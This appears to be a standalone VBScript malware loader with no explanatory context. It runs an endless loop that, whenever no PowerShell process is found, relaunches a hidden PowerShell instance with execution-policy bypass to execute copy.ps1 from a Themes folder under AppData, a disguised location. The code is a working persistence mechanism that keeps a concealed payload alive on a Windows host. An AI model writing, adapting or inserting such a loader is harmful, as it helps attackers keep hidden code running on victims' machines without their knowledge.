Dim objShell, objWMIService, colProcesses, objProcess
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")

Do
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe'")
    
    If colProcesses.Count = 0 Then
        objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
    End If
    WScript.Sleep 30000
Loop
